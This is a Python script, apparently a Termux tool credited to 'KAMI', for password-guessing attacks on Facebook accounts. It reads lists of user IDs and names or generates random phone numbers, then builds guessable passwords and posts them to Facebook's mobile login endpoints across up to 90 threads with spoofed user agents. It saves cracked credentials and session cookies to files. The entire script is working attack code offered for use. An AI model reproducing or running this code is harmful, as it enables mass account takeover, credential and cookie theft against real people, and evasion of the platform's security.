import requests
import time,datetime
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python Run.py')


    
ugen=[]
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)


useragen =[
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36',
	'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
	'Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15',
	'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.20 (KHTML, like Gecko) Mobile/7B298g',
	'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
	'Mozilla/5.0 (iPad; U; CPU OS OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10',
	'Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; da-dk) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5',
	'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
	'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1',
	'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
	'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996',
	'Opera/9.80 (Android 4.1.2; Linux; Opera Mobi/ADR-1305251841) Presto/2.11.355 Version/12.10',
	'Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21214/28.2725; U; ru) Presto/2.8.119 Version/11.10',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) OPiOS/10.2.0.93022 Mobile/11D257 Safari/9537.53',
	'Mozilla/5.0 (Android 7.0; Mobile; rv:54.0) Gecko/54.0 Firefox/54.0',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) FxiOS/7.5b3349 Mobile/14F89 Safari/603.2.4',
	'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 5.1.1; SM-N750K Build/LMY47X; ko-kr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Puffin/6.0.8.15804AP',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-IE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.114 Safari/537.36 Puffin/5.2.6IP',
	'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G955U Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 6.0; Lenovo K50a40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.137 YaBrowser/17.4.1.352.00 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0.3',
	'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977',
	'Mozilla/5.0 (BB10; Kbd) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.3.2205 Mobile Safari/537.35',
	'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5v',
	'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25',]
os.system('clear')
logo=("""\033[1;37m
  _  __    _    __  __ ___ ___ 
 | |/ /   / \  |  \/  |_ _|_ _|
 | ' /   / _ \ | |\/| || | | | 
 | . \  / ___ \| |  | || | | | 
 |_|\_\/_/   \_\_|  |_|___|___|           
----------------------------------------------
[*] Created  : Kamran Haider
[*] facebook : Kamran Haider
[*] Vesion   : 1.0
[*] YouTube  : KAMI Termux Tools
----------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------')	
loop = 0
oks = []
cps = []
loop=0
oks=[]
cps=[]
pcp=[]
id=[]

def menu():
    os.system('clear')
    print(logo)
    print('[1] File Cloning Menu')
    print('[2] Random Cloning')
    print('[3] Create File Menu')
    print('[4] Remove Double Links')
    print('\033[1;37m----------------------------------------------')
    opt = input('[+] Choose Option : ')
    if opt =='1':
        fia()
    elif opt =='2':
        random_nmb()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')

def fia():    
			#print(logo)
			os.system('clear')
			print(logo)
			print('\x1b[1;32m>>> I AM ALONE IN MY TEAM')
			linex()
			print('[1] Crack File ')
			linex()
			xd=input('[*] Choose an option: ')
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/filename.txt')
				linex()
				file = input('[+] Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				os.system('clear')
				print(logo)
				
		
				print('[1] Method 1')
				print('[2] Method 2')
				linex()
				mthd=input('[+] Choose : ')
				linex()
				plist = []
				try:
					
				    #linex()
				
					ps_limit = int(input('[+] How many passwords do you want to add : '))
				except:
					ps_limit =1
				
				linex()
				for i in range(ps_limit):
				
					plist.append(input(f'[+] Put password {i+1}: '))
				linex()
				print('[1] Enter For Cloning')
				linex()
				cx=input('[+] Choose : ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
					
				else:
					pcp.append('n')
				with tred(max_workers=90) as crack_submit:
					os.system('clear')
					print(logo)
					total_ids = str(len(fo))
					
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(ffb,ids,names,passlist)
						elif mthd in ['2', '02']:
							crack_submit.submit(opera,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press enter to back ')
				os.system('python KAMI.py')
			else:
				exit(' Option not found in menu...')

def random_nmb():
	uid=[]
	os.system('clear')
	print(logo)
	print('[+] EXAMPLE : 92318 : 92345 : 92323 : 92306')
	print('\033[1;37m----------------------------------------------')
	kode = input('[+]\33[1;37m ENTER CODE : ')
	os.system('clear')
	print(logo)
	limit = int(input('[+] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[+] Total Ids : '+tl)
		print('[+] Choice code : \033[1;92m'+kode)
		print('\033[1;37m----------------------------------------------') 
		print('[+] \033[38;5;204mUse flight mode for speed up\33[1;97m')
		print('\033[1;37m----------------------------------------------') 
		for guru in uid:
			uid = kode+guru
			pwx = [kode, kode+guru,'khankhan','khan1122',]
			yaari.submit(rcrack1,uid,pwx,tl)
	print(47*"—") 
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [KAMI-OK.txt,KAMI-CP.txt]')
	print(47*"—") 
	input('Press Enter To Go Back To Menu')
	menu()


def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'private, no-cache, no-store, must-revalidate',
            "referer": 'https://mbasic.facebook.com/',
            "sec-ch-ua": '""Chromium";v="108", "Opera";v="94", "Not)A;Brand";v="99"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'none',
            "sec-fetch-user": '?1',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent":'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\33[38;5;46m[OK] {uid}|{ps}")
                print(f" \ Cookie : {coki}")
                open('/sdcard/KAMI-OK.txt', 'a').write( uid+' | '+ps+'\'')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\1b[38;5;196m[CP] {cid}|{ps}")
                open('/sdcard/KAMI-CP.txt', 'a').write( uid+' | '+ps+' \'')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\33[1;37m[Crack] %s|\33[1;32mOK:-%s \33[1;37m\r'%(loop,len(oks)));sys.stdout.flush()
    except:
        pass

#method 1


def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[KAMII] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		
		first = names.split(' ')[0]
		try:
			
			last = names.split(' ')[1]
		except:
			
			last = 'Khan'

		ps = first.lower()
		ps2 = last.lower()
		
		for fikr in passlist:
			
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			
			ua=random.choice(ugen)
			
			head = {'Host': 'p.facebook.com',
						   'method':'GET',
                           'viewport-width': '980',
                           'sec-ch-ua': '""Chromium";v="108", "Opera";v="94", "Not)A;Brand";v="99""', 
                           'sec-ch-ua-mobile': '?0',
                           'sec-ch-ua-platform':'"Windows"', 
                           'sec-ch-prefers-color-scheme': 'light',
                           'dnt': '1',
                           'upgrade-insecure-requests': '1',
                           'user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27',
                           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
                           'sec-fetch-site': 'none',
                           'sec-fetch-mode': 'navigate',
                           'sec-fetch-user': '?1', 
                           'sec-fetch-dest': 'document', 
                           'accept-encoding': 'gzip, deflate, br',
                           'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"',
            str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', 
            str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			kami=session.cookies.get_dict().keys()
			if "c_user" in kami:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [KAMII-OK] %s | %s'%(ids,pas))
				open('/sdcard/KAMI-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in kami:
				if 'y' in pcp:
					# print('\r\r\33[1;31m[CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/KAMI-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1

	
# method 2 from opera browser

def opera(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[KAMII] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		
		first = names.split(' ')[0]
		try:
			
			last = names.split(' ')[1]
		except:
			
			last = 'Khan'

		ps = first.lower()
		ps2 = last.lower()
		
		for fikr in passlist:
			
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			
			ua=random.choice(ugen)
			
			head = {'Host': 'mbasic.facebook.com',
						   'method':'GET',
                           'viewport-width': '980',
                           'sec-ch-ua': '""Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108""', 
                           'sec-ch-ua-mobile': '?0',
                           'sec-ch-ua-platform':'"Windows"', 
                           'sec-ch-prefers-color-scheme': 'light',
                           'dnt': '1',
                           'upgrade-insecure-requests': '1',
                           'user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27',
                           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
                           'sec-fetch-site': 'none',
                           'sec-fetch-mode': 'navigate',
                           'sec-fetch-user': '?1', 
                           'sec-fetch-dest': 'document', 
                           'accept-encoding': 'gzip, deflate, br',
                           'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"',
            str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', 
            str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			kami=session.cookies.get_dict().keys()
			if "c_user" in kami:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [KAMII-OK] %s | %s'%(ids,pas))
				open('/sdcard/KAMI-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in kami:
				if 'y' in pcp:
					print('\r\r\33[1;31m[CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/KAMI-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1


if __name__=='__main__':
	print('Checking Update')
	os.system("git pull")
	menu()